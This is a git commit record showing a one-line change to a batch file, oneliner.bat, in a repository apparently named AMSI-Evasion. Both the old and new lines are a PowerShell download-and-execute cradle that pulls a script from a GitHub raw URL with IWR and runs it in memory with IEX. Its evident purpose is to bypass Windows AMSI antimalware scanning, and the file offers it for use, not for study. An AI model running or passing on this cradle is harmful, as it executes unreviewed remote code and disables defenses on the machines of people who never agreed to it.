7c46846b0112c7828cbc25a0172ff5c3c6ad8752
Devshimitsu <65497645+Devshimitsu@users.noreply.github.com>
2024-10-01 22:57:57 +0530

    Update oneliner.bat

--- oneliner.bat
+++ oneliner.bat
@@ -1,1 +1,1 @@
-powershell -command "IEX(IWR https://raw.githubusercontent.com/Devshimitsu/AMSI-Evasion/main/One-Liner.ps1 -UseBasicParsing); One-Liner"
+powershell -command "IEX(IWR https://raw.githubusercontent.com/Devshimitsu/AMSI-Evasion/refs/heads/main/oneliner.ps1 -UseBasicParsing); One-Liner"
